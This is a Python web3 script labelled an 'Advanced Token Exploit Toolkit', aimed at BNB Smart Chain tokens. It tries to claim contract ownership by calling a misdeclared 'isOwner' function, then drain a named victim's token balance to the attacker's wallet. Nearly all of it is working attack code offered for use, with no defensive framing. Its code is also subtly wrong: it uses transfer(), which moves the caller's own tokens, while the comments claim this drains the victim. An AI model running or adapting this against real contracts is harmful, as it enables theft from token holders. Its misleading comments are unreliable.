from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Advanced Token Exploit Toolkit")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)

# ===== COMPLETE TOKEN ABI =====
TOKEN_ABI = [
    # Ownership Functions
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    # Token Functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "address", "name": "spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

# ===== CORE FUNCTIONS =====
def send_transaction(contract_function, value=0, gas=300000, retries=3, delay=5):
    """Robust transaction sending with retries and gas management"""
    for attempt in range(retries):
        try:
            tx = contract_function.build_transaction({
                "from": account.address,
                "nonce": w3.eth.get_transaction_count(account.address),
                "gas": gas,
                "gasPrice": int(w3.eth.gas_price * 1.2),  # 20% gas premium
                "value": value
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            return w3.eth.wait_for_transaction_receipt(tx_hash)
        except exceptions.TransactionNotFound:
            if attempt == retries - 1:
                raise
            time.sleep(delay)
        except ValueError as e:
            if "replacement transaction underpriced" in str(e) and attempt < retries - 1:
                time.sleep(delay)
                continue
            raise

def verify_contract_state(token):
    """Check key contract state variables"""
    print("\n[+] Contract State Verification:")
    victim_bal = token.functions.balanceOf(args.victim_address).call()
    print(f"Victim Balance: {victim_bal}")
    
    allowance = token.functions.allowance(args.victim_address, account.address).call()
    print(f"Allowance for Attacker: {allowance}")

def execute_exploit():
    """Main exploit execution flow"""
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)
    
    print(f"\n[+] Target Contract: {args.token_address}")
    print(f"[+] Attacker Address: {account.address}")
    print(f"[+] Victim Address: {args.victim_address}")
    
    # Initial state check
    verify_contract_state(token)
    
    # Step 1: Become owner by calling isOwner
    print("\n[1] Attempting to become owner...")
    try:
        receipt = send_transaction(token.functions.isOwner(account.address), gas=500000)
        print(f"TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
        if receipt.status != 1:
            print("Ownership claim failed")
            return
    except Exception as e:
        print(f"Ownership claim error: {str(e)}")
        return
    
    # Wait for state update
    time.sleep(10)
    
    # Step 2: Direct transfer from victim to attacker (no allowance needed for owner)
    print("\n[2] Attempting transfer...")
    victim_bal = token.functions.balanceOf(args.victim_address).call()
    if victim_bal == 0:
        print("Victim has no balance to transfer")
        return
    
    try:
        # Using transfer() instead of transferFrom() since we're now owner
        receipt = send_transaction(
            token.functions.transfer(
                account.address,
                victim_bal
            ),
            gas=500000
        )
        
        print("\n[+] Transfer Results:")
        print(f"TX Hash: {receipt.transactionHash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        print(f"Gas Used: {receipt.gasUsed}")
        
        # Final verification
        new_bal = token.functions.balanceOf(args.victim_address).call()
        print(f"New Victim Balance: {new_bal}")
        
    except Exception as e:
        print(f"\n[!] Transfer failed: {str(e)}")
        print("Potential reasons:")
        print("- Contract has additional transfer restrictions")
        print("- Need to wait longer for ownership activation")

if __name__ == "__main__":
    execute_exploit()
